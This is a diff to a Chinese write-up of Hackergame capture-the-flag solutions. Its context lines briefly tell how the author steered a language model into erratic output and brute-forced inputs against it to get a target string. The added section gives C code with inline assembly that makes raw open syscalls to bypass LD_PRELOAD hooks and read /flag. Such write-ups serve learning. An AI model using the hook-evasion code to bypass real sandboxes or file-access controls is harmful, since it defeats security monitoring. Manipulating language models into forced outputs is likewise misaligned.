@@ -325,3 +325,59 @@ Hackergame 启动
    - 第一问就差点给我整疯掉，因为一直没发现他的回答是接着我的话继续编故事的。后面发现这个规律以后反而还能逼模型发疯了（（比如下图 ![llm_go_mad.jpg](img/llm_go_mad.jpg)
  - accept
    - 看到题目说要求七个字符输出心就凉了大半，没办法硬着头皮上，本地跑模型开始字典 brute force，最后跑出来一个 `d}`，成功拿到了 flag
+
+为什么要打开 /flag
+---
+ - LD_PRELOAD, love!
+   - 虽然题目附件里把我能想到的大部分骚操作都给 hook 走了，但是他拦不住我 syscall 呀！
+```c
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int syscall_open(char *path, long oflag)
+{
+    int fd = -1;
+    #ifdef __i386__
+    __asm__ (
+             "mov $5, %%eax;" // Open syscall number
+             "mov %1, %%ebx;" // Address of our string
+             "mov %2, %%ecx;" // Open mode
+             "mov $0, %%edx;" // No create mode
+             "int $0x80;"     // Straight to ring0
+             "mov %%eax, %0;" // Returned file descriptor
+             :"=r" (fd)
+             :"m" (path), "m" (oflag)
+             :"eax", "ebx", "ecx", "edx"
+             );
+    #elif __amd64__
+    __asm__ (
+             "mov $2, %%rax;" // Open syscall number
+             "mov %1, %%rdi;" // Address of our string
+             "mov %2, %%rsi;" // Open mode
+             "mov $0, %%rdx;" // No create mode
+             "syscall;"       // Straight to ring0
+             "mov %%eax, %0;" // Returned file descriptor
+             :"=r" (fd)
+             :"m" (path), "m" (oflag)
+             :"rax", "rdi", "rsi", "rdx"
+             );
+    #endif
+    return fd;
+ }
+
+int main(void)
+{
+    char buffer[256];
+    int fd = syscall_open("/flag", O_RDONLY);
+    if (fd == -1) {
+        fprintf(stderr, "open failed\n");
+        return NULL;
+    }
+    read(fd, buffer, sizeof(buffer));
+    close(fd);
+    fprintf(stdout, "%s", buffer);
+    return 0;
+}
+```
